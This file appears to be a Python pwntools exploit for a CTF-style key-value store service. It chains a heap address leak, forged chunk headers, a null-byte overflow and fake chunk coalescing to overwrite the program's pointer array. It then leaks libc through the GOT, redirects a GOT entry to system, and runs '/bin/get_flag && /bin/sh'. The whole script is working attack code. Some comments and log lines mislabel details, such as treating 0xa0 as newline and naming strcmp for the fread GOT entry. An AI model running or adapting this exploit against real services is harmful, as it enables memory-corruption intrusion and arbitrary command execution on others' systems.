#!/usr/bin/python3

#import libraries
import sys
import time
from itertools import count
import binascii
#get some pwn stuff into global namespace
from pwn import p64, sleep, remote, context
#disable annoying pwntools log messages (e.g. info regarding opened/closed connection)
context.log_level = 'error'

#set host and port to connect to
host = "hacky2"
port = 13723
if len(sys.argv) >= 2:
    host = sys.argv[1]
if len(sys.argv) >= 3:
    port = int(sys.argv[2])


spawn_interactive_shell = False

str_cmd_add = b"a"
str_cmd_edit = b"e"
str_cmd_print = b"p"
str_cmd_unsafe_del = b"d"
str_cmd_safe_del = b"D"
str_cmd_quit = b"q"

str_prompt_cmd = b"Command? \x1b[33m"
str_prompt_key = b"Enter key: \x1b[33m"
str_prompt_val = b"Enter value: \x1b[33m"

flag_prev_in_use = 0x1


#This is where the exploit lives.
def exploit():
    proc = remote(host, port, fam="ipv4")

    proc.readuntil(b"(Serial key: ")
    serial_key = int(proc.readuntil(b")!\x1b[0m\n")[:-7], 16)
    print(f"(-) Read Serial key: {serial_key:#0{0}18x}")
    addr_heap_base = (0x7faaa ^ (serial_key >> 44)) << 12
    print(f"(-) Extracted heap start address from serial key: {addr_heap_base:#0{0}18x}")
    proc.readuntil(b"All of them!\x1b[0m\n")


    print("(-) Allocating 7 chunks of size 0x100, that will be used to fill tcache later on.")
    #add 7 chunks of size 0x100 (used to fill tcache)
    for i in range(1,8):
        curr_key = (0x3000 + 0x30+i).to_bytes(2, 'big') #Assign keys '01' to '07'
        curr_fill_letter = (0x40+i).to_bytes(1,'big')   #Fill userdte with 'A' to 'G'
        target_add(proc, curr_key, (0xC8-1)*curr_fill_letter)


    #Calculate Addresses where taget chunks will be allocated:

    struct_size_without_val = 0x28
    struct_alignment_offset = struct_size_without_val % 0x10
    default_free_chunk_header_size = 0x20
    default_alloc_chunk_header_size = 0x10

    #add chunk '08' of size 0xf0 with header at addr_heap_base + 0xa70
    curr_heap_offset = 0xa70
    addr_heap_chunk08_header = addr_heap_base + curr_heap_offset
    addr_heap_chunk08_userdata = addr_heap_base + curr_heap_offset + default_alloc_chunk_header_size
    chunk08_size = 0xf8

    #add chunk '09' of size 0x120
    curr_heap_offset += (chunk08_size & 0xFFFFFFFFFFFFFFF0)
    addr_heap_chunk09_header = addr_heap_base + curr_heap_offset
    addr_heap_chunk09_userdata = addr_heap_base + curr_heap_offset + default_alloc_chunk_header_size
    #This will be the size of chunk '09' once we perform our overflow later on
    chunk09_fakesize = 0x100
    #This is its size before that
    chunk09_realsize = 0x120

    ###NOTE: that realloc will allocate another chunk of size 0x60 between chunk 9 and 10
    ###      in order to enlarge the keyval pointer array
    intermediate_arr_chunk_size = 0x60
    curr_heap_offset += intermediate_arr_chunk_size
    addr_heap_intermediate_arr_header = addr_heap_base + curr_heap_offset

    #add chunk '10' of size 0x100
    curr_heap_offset += chunk09_realsize
    addr_heap_chunk10_header = addr_heap_base + curr_heap_offset
    addr_heap_chunk10_userdata = addr_heap_base + curr_heap_offset + default_alloc_chunk_header_size
    chunk10_size = 0x100


    #location of fakechunk 0.
    #this is the chunk we'r backwards-coalescing with
    addr_heap_fakeheader0 = addr_heap_chunk08_userdata + struct_size_without_val + struct_alignment_offset
    #location of fakechunk1.
    #This is where the fake fd pointer pointing to chunk '08' is located.
    #This is also where the fake bw pointer pointing to fakechunk2 is located
    #It's placement is arbitrarily chosen to immediately follow the location of fakeheader0.
    addr_heap_fakeheader1 = addr_heap_fakeheader0 + default_free_chunk_header_size
    #location of fakechunk2.
    #This is where the manipulated size of chunk '9' points to
    #Hence this is the chunk we're forwards-coalescing with
    addr_heap_fakeheader2 = addr_heap_chunk09_header + chunk09_fakesize
    #location of fakechunk3. Must not have prev_in_use falg for previous chunk set.
    #This is here to tell free that the chunk we're forwards coalescing with is actually free.
    #Also chunk size should point to a valid header of in-use chunk.
    fakeheader2_sizeval = (chunk09_realsize - chunk09_fakesize) + intermediate_arr_chunk_size + default_alloc_chunk_header_size + (struct_size_without_val + struct_alignment_offset)
    addr_heap_fakeheader3 = addr_heap_fakeheader2 + fakeheader2_sizeval


    #content of fakechunk0
    fakeheader0_prevsz = b"IRELEVNT" #irrelevant (8 arbitrary bytes) - prev is 'in use'
    fakeheader0_sizeval = chunk08_size - (default_alloc_chunk_header_size + struct_size_without_val + struct_alignment_offset)
    fakeheader0_sizeval_aligned = fakeheader0_sizeval & 0xFFFFFFFFFFFFFFF0
    fakeheader0_sz = p64(fakeheader0_sizeval_aligned | flag_prev_in_use)
    fakeheader0_fd = p64(addr_heap_fakeheader2)
    fakeheader0_bw = p64(addr_heap_fakeheader1)
    fakeheader0 = fakeheader0_prevsz + fakeheader0_sz + fakeheader0_fd + fakeheader0_bw
    print(f"(-) Crafted fake chunk header 0 with intended address {addr_heap_fakeheader0:#0{0}18x}:")
    print_p64_split_hex(fakeheader0, "    ")

    #content of fakechunk1
    fakeheader1_prevsz = b"IRELEVNT" #irrelevant (8 arbitrary bytes)
    fakeheader1_sz = b"IRELEVNT" #irrelevant (8 arbitrary bytes)
    fakeheader1_fd = p64(addr_heap_fakeheader0)
    fakeheader1_bw = p64(addr_heap_fakeheader2)
    fakeheader1 = fakeheader1_prevsz + fakeheader1_sz + fakeheader1_fd + fakeheader1_bw
    print(f"(-) Crafted fake chunk header 1 with intended address {addr_heap_fakeheader1:#0{0}18x}:")
    print_p64_split_hex(fakeheader1, "    ")

    #content of fakechunk2
    fakeheader2_prevsz = p64(0x0) #NOT SET, since prev is in use. Would be 0x100.
    fakeheader2_sz = p64(fakeheader2_sizeval | flag_prev_in_use)
    fakeheader2_fd = p64(addr_heap_fakeheader1)
    fakeheader2_bw = p64(addr_heap_fakeheader0)
    fakeheader2 = fakeheader2_prevsz + fakeheader2_sz + fakeheader2_fd + fakeheader2_bw
    print(f"(-) Crafted fake chunk header 2 with intended address {addr_heap_fakeheader2:#0{0}18x}:")
    print_p64_split_hex(fakeheader2, "    ")

    #content of fakeheader3
    fakeheader3_prevsz = p64(fakeheader2_sizeval) #This is offset to next 'real' in-use chunk
    fakeheader3_sizeval = 0xc0 #TODO NO HARDCODE
    fakeheader3_sz = p64(fakeheader3_sizeval)
    fakeheader3_fd = p64(0x0) #NOT SET as chunk is 'in use'
    fakeheader3_bw = p64(0x0) #NOT SET as chunk is 'in use'
    fakeheader3 = fakeheader3_prevsz + fakeheader3_sz + fakeheader3_fd + fakeheader3_bw
    print(f"(-) Crafted fake chunk header 3 with intended address {addr_heap_fakeheader3:#0{0}18x}:")
    print_p64_split_hex(fakeheader3, "    ")


    #edit chunk '09' to add fake headers there
    chunk09_value = (chunk09_fakesize - (default_alloc_chunk_header_size + struct_size_without_val)) * b'X'
    chunk09_value += fakeheader2
    print("(-) Crafted chunk '09' value content:")
    print_p64_split_hex(chunk09_value, "    ")

    #edit chunk '10' to add fake headers there
    chunk10_value = (struct_alignment_offset)*b'Y'
    chunk10_value += fakeheader3
    chunk10_value += (chunk10_size - (default_alloc_chunk_header_size + struct_size_without_val + struct_alignment_offset + default_free_chunk_header_size))*b'Y'
    print("(-) Crafted chunk '10' value content:")
    print_p64_split_hex(chunk10_value, "    ")

    #edit chunk '08' to add fake headers there and overflow into size of chunk 09
    chunk08_value = (struct_alignment_offset)*b'Z'
    chunk08_value += fakeheader0
    chunk08_value += fakeheader1
    chunk08_value += (fakeheader0_sizeval - (struct_alignment_offset + 2*default_free_chunk_header_size))*b'Z'
    chunk08_value += p64(fakeheader0_sizeval_aligned) #fake prev size for fakechunk0
    print("(-) Crafted chunk '08' value content:")
    print_p64_split_hex(chunk08_value, "    ")


    #add chunk '08' of size 0xb0 with userdata at addr_heap_base + 0xa80
    #chunk08_key = 8*b'b' + 6*b'l' + b'\x00u'#p64(addr_heap_fakeheader2) + p64(addr_heap_fakeheader1)
    #NOTE that key input terminates on null byte.
    #To manipulate slot of fd and bw ptr we have to do this in two steps.
    #first add chunk to place addr_heap_fakeheader1 in bw pointer
    print(f"(-) Allocating chunk '08' of size {chunk08_size:#0x} at address {addr_heap_chunk08_header:#0{0}18x}.")
    target_add(proc, b'08', (0xc0-1)*b'H')#8*b'H' + p64(addr_heap_fakeheader1), (0xb0-1)*b'H')
    #the second step will follow once we added the other chunks, so it's not the last one on the heap.
    #this is to ensure that chunk will be put into tcache bin and not freed by shrinking the heap

    #add chunk '09' of size 0x120 with userdata at addr_heap_base + 0xb30
    print(f"(-) Allocating chunk '09' of size {chunk09_realsize:#0x} at address {addr_heap_chunk09_header:#0{0}18x}.")
    target_add(proc, b'09', (0xE8-1)*b'I')
    #add chunk '10' of size 0x100 with userdata at addr_heap_base + 0xcb0
    print(f"(-) Allocating chunk '10' of size {chunk10_size:#0x} at address {addr_heap_chunk10_header:#0{0}18x}.")
    print(f"    'struct keyval **kvs' will be reallocated into chunk of size {intermediate_arr_chunk_size:#0x} after this one (at address {addr_heap_intermediate_arr_header:#0{0}18x}).")
    target_add(proc, b'10', (0xc8-1)*b'J')
    #We want another chunk allocated after this one. The size of this one isn't too relevant for now.
    #add chunk of size 0xa0
    print("(-) Allocating additional chunk '11' as barrier to wilderness.")
    target_add(proc, b'11', (0x68-1)*b'K')


    #Now perform the edits prepared above:

    #remove last character of prepared chunk09_value, since terminating '\n' will be replaced with '\x00'
    if b'\xa0' in chunk09_value:
        print("(-) Error: Cannot write chunk '09' content due to newline (0xa0) in address.")
        proc.close()
        return False
    print("(-) Iteratively editing chunk '09' to place fake headers (including NULL bytes) in memory:")
    target_edit_nullaware(proc, b'09', chunk09_value[:-1], verbose=True)

    #remove last character of prepared chunk10_value, since terminating '\n' will be replaced with '\x00'
    print("(-) Iteratively editing chunk '10' to place fake headers (including NULL bytes) in memory:")
    target_edit_nullaware(proc, b'10', chunk10_value[:-1], verbose=True)
    if b'\xa0' in chunk10_value:
        print("(-) Error: Cannot write chunk '10' content due to newline (0xa0) in address.")
        proc.close()
        return False

    #Terminating '\n' will be replaced with '\x00'.
    #This NULL byte will overflow into size of chunk 9.
    #NOTE: Since input during edit is copied with strcpy, we have to do a seperate edit for each 
    #      time we encounter a NULL byte in the input
    fakefreechunk_sizeval = chunk09_fakesize + fakeheader0_sizeval_aligned + fakeheader2_sizeval
    print("(-) Iteratively editing chunk '08' to place fake headers (including NULL bytes) in memory:")
    print(f"    Overflow into size of chunk '09' will be triggered: {chunk09_realsize:#0x} --> {chunk09_fakesize:#0x}")
    target_edit_nullaware(proc, b'08', chunk08_value, verbose=True)
    if b'\xa0' in chunk08_value:
        print("(-) Error: Cannot write chunk '10' content due to newline (0xa0) in address.")
        proc.close()
        return False

    #idelete 7 chunks of size 0x100 to fill tcache
    print("(-) Freeing chunks '1' to '7' of size 0x100 to fill corresponding tcache bin.")
    for i in range(1,8):
        curr_key = (0x3000 + 0x30+i).to_bytes(2, 'big')
        target_unsafe_del(proc, curr_key)

    #free chunk '09' to consolidate with fake chunks
    #this yields a free chunk of size 0x270 in unsorted bin, that overlaps with several other allocated chunks
    print(f"(-) Free chunk '09' of with manipulated size {chunk09_fakesize:#0x}.")
    print(f"    As the corresponding tcache bin is already full, this will:")
    print(f"    - trigger backward coalescing with fakeheader0 emulating chunk of size {fakeheader0_sizeval:#0x}")
    print(f"    - trigger forward coalescing with fakeheader2 emulating chunk of size {fakeheader2_sizeval:#0x}")
    print(f"    - result in a free chunk of size {fakefreechunk_sizeval:#0x} at address {addr_heap_fakeheader0:#0{0}18x}")
    print(f"    - cause the resulting free chunk to be inserted into the unsorted bin")
    print(f"    - cause the resulting free chunk to fully encompass the chunk containing the 'kvs' array")
    target_unsafe_del(proc, b"09")


    #address of section .got.plt (PIE is disabled)
    addr_vuln_section_got_plt = 0x404000
    #this is the got entry of fread@got.plt
    #note that this function hasn't been called so far
    #since only partial RELRO is enabled we hence know the address that is stored there (points to linker code reference in plt to lazily resolve address)
    addr_vuln_got_plt_fread = addr_vuln_section_got_plt + 0x30
    addr_vuln_plt_fread_linker = 0x401066
    offset_fakefreechunk_to_kvs = 0x1d0
    #assign arbitrary key to our new chunk
    chunk_masteroverrider_key = b"master_overrider"
    #add filler bytes to value in order to reach kvs array
    chunk_masteroverrider_val_fillerstr = ((offset_fakefreechunk_to_kvs + default_alloc_chunk_header_size) - (default_alloc_chunk_header_size+struct_size_without_val))*b'R'
    chunk_masteroverrider_val = chunk_masteroverrider_val_fillerstr
    #write pointer to got entry of fread to kvs array
    chunk_masteroverrider_val += p64(addr_vuln_got_plt_fread)
    #Now add some null bytes to allocate the full fake-chunk without overriding anything else (strcpy terminates at NULL). NOTE: this is nice to have, but may not be necessary in the end
    chunk_masteroverrider_val += (fakefreechunk_sizeval - (offset_fakefreechunk_to_kvs + default_alloc_chunk_header_size + 0x8))*b'\x00'
    print(f"(-) Allocating chunk of size {fakefreechunk_sizeval:#0x} in fake free chunk. This includes:")
    print("    - Creating an allocated chunk that fully encompasses 'kvs' array")
    print("    - Preventing full override of 'kvs' array with early terminating NULL byte in input")
    print(f"    - Overriding first element in 'kvs' array with address fread@got.plt: {addr_vuln_got_plt_fread:#0{0}18x} (no PIE)")
    target_add(proc, chunk_masteroverrider_key, chunk_masteroverrider_val[:-1])


    #print chunk 8 to leak address of libc from fake free chunk in unsorted bin
    print(f"(-) Using address of fread@plt+6 ({addr_vuln_plt_fread_linker:#0{0}18x}) as key to print content of got.plt")
    print("    This address is in memory at fread@got.plt ({addr_vuln_got_plt_fread:#0{0}18x}) due to lazy linking (partial RELRO)")
    libc_leak = target_print(proc, p64(addr_vuln_plt_fread_linker))[9:]
    if len(libc_leak) != 11:
        print("(-) Error leaking libc. Probably encountered a NULL byte in address.")
        proc.close()
        return False
    addr_libc_srandom = int.from_bytes(libc_leak[:6], 'little')
    print(f"(-) Successfully leaked libc address srandom@libc: {addr_libc_srandom:#0{0}18x}")
    addr_libc_base = addr_libc_srandom - 0x3c070
    addr_libc_system = addr_libc_base + 0x45e50
    print("(-) Calculated lib addresses with static offsets:")
    print(f"   - libc start:  {addr_libc_base:#0{0}18x}")
    print(f"   - system@libc: {addr_libc_system:#0{0}18x}")


    print(f"(-) Replacing address strcmp@libc at strcmp@got.plt with system@libc ({addr_libc_system:#0{0}18x}).")
    target_edit(proc, p64(addr_vuln_plt_fread_linker), 8*b"A"+p64(addr_libc_system)[:-1])


    exec_str = b'/bin/get_flag && /bin/sh\x00'
    print(f"(-) Triggering lookup(...) on key {exec_str} to call system(...) via strcmp@got.plt.")
    target_enter_cmd(proc, str_cmd_add)
    target_enter_key(proc, exec_str)

    flag = proc.readline()
    if b'flag' in flag:
        print(f"(-) Successfully retrieved flag: {flag.decode()}")
        if spawn_interactive_shell:
            proc.interactive()
        else:
            proc.write(b"exit\n")
    else:
        print("(-) Something went wrong retrieving the flag.")
        proc.close()
        return False

    proc.close()
    return True


def target_edit_nullaware(target, key, val, cmd=str_cmd_edit, expect_command_prompt=True, give_command=True, newline_terminate_cmd=True, newline_terminate_key=True, verbose=False):
    val_currlen = len(val)
    if verbose: print(f"    --> Writing NULL byte after last input character at index {val_currlen} (may trigger overflow depending on input length and alignment).")
    target_edit(target, key, (val_currlen)*b"z")
    while val_currlen > 0:
        #each iteration wei write data starting at this index until (including) the first NULL byte
        write_from_idx = val_currlen-1
        if val[val_currlen-1] == 0: write_from_idx -= 1
        for i in reversed(range(0,write_from_idx+1)):
            if val[write_from_idx] == 0:
                write_from_idx += 1
                break
            elif write_from_idx <= 0:
                write_from_idx = 0
                break
            else:
                write_from_idx -= 1
        if verbose: print(f"    --> Wrote {val[write_from_idx:val_currlen]} to chunk.val from index {write_from_idx} to {val_currlen-1}.")
        target_edit(target, key, (write_from_idx)*b"z" + val[write_from_idx:val_currlen])
        val_currlen = write_from_idx


def target_enter_cmd(target, cmd, expect_command_prompt=True, newline_terminate=True, verbose=False):
    if expect_command_prompt:
        tmp_result = target.readuntil(str_prompt_cmd)
        if verbose: print(tmp_result)
    target.write(cmd + (b"\n" if newline_terminate else b""))
    return

def target_enter_key(target, key, newline_terminate=True, verbose=False):
    tmp_result = target.readuntil(str_prompt_key)
    if verbose: print(tmp_result)
    target.write(key + (b"\n" if newline_terminate else b""))
    return

def target_enter_val(target, val, newline_terminate=True, verbose=False):
    tmp_result = target.readuntil(str_prompt_val)
    if verbose: print(tmp_result)
    target.write(val + (b"\n" if newline_terminate else b""))
    return

def target_add(target, key, val, cmd=str_cmd_add, expect_command_prompt=True, give_command=True, newline_terminate_cmd=True, newline_terminate_key=True, newline_terminate_val=True, verbose=False):
    if give_command: target_enter_cmd(target, cmd, expect_command_prompt, newline_terminate_cmd, verbose)
    target_enter_key(target, key, newline_terminate_key, verbose)
    target_enter_val(target, val, newline_terminate_val, verbose)
    return

def target_edit(target, key, val, cmd=str_cmd_edit, expect_command_prompt=True, give_command=True, newline_terminate_cmd=True, newline_terminate_key=True, newline_terminate_val=True, verbose=False):
    if give_command: target_enter_cmd(target, cmd, expect_command_prompt, newline_terminate_cmd, verbose)
    target_enter_key(target, key, newline_terminate_key, verbose)
    target_enter_val(target, val, newline_terminate_val, verbose)
    return

def target_print(target, key, cmd=str_cmd_print, expect_command_prompt=True, give_command=True, newline_terminate_cmd=True, newline_terminate_key=True, newline_terminate_val=True, verbose=False):
    if give_command: target_enter_cmd(target, cmd, expect_command_prompt, newline_terminate_cmd, verbose)
    target_enter_key(target, key, newline_terminate_key, verbose)
    print_result_raw = target.readuntil(b"\x1b[0m\n")
    if verbose: print(print_result_raw)
    return print_result_raw

def target_unsafe_del(target, key, cmd=str_cmd_unsafe_del, expect_command_prompt=True, give_command=True, newline_terminate_cmd=True, newline_terminate_key=True, newline_terminate_val=True, verbose=False):
    if give_command: target_enter_cmd(target, cmd, expect_command_prompt, newline_terminate_cmd, verbose)
    target_enter_key(target, key, newline_terminate_key, verbose)
    return

def target_safe_del(target, key, cmd=str_cmd_safe_del, expect_command_prompt=True, give_command=True, newline_terminate_cmd=True, newline_terminate_key=True, newline_terminate_val=True, verbose=False):
    if give_command: target_enter_cmd(target, cmd, expect_command_prompt, newline_terminate_cmd, verbose)
    target_enter_key(target, key, newline_terminate_key, verbose)
    return

def print_p64_split(input_str, lineoffset=b""):
    input_len = len(input_str)
    for i in range(0,input_len//8):
        print(f"{lineoffset}{i*8:#0{0}5x}: {input_str[i*8:(i+1)*8]}")
    if input_len % 8 != 0:
        print(f"{lineoffset}{input_len:#0{0}5x}: {input_str[input_len//8:(input_len//8)+(input_len%8)]}")

def print_p64_split_hex(input_str, lineoffset=b""):
    input_len = len(input_str)
    for i in range(0,input_len//8):
        print(f"{lineoffset}{i*8:#0{0}5x}: {int.from_bytes(input_str[i*8:(i+1)*8], 'little'):{0}16x}")
    if input_len % 8 != 0:
        print(f"{lineoffset}{input_len:#0{0}5x}: {int.from_bytes(input_str[input_len//8:(input_len//8)+(input_len%8)]):{0}16x} (lower {input_len%8} only)")

#Invoke the exploit when the script is executed.
while True:
    if exploit() != True: print("\n(X) Retrying after Error...\n")
    else: break
